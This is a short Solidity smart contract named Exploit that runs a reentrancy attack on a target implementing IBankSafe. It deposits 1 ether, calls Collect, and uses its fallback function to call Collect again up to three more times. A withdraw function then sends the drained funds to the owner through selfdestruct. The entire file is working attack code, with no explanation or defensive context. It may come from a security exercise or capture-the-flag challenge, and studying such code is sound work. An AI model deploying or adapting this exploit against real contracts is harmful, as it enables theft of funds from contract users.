pragma solidity ^0.4.19;

interface IBankSafe {
    function Deposit() external payable;
    function Collect(uint _am) external payable;
}

contract Exploit {
    IBankSafe public target;
    address owner;
    uint public reentryCount = 0;
    uint public maxReentry = 3; // Withdraw multiple times

    constructor(address _target) public {
        target = IBankSafe(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        target.Deposit.value(1 ether)();
        target.Collect(1 ether);
    }

    function() public payable {
        if (reentryCount < maxReentry) {
            reentryCount++;
            target.Collect(1 ether);
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}

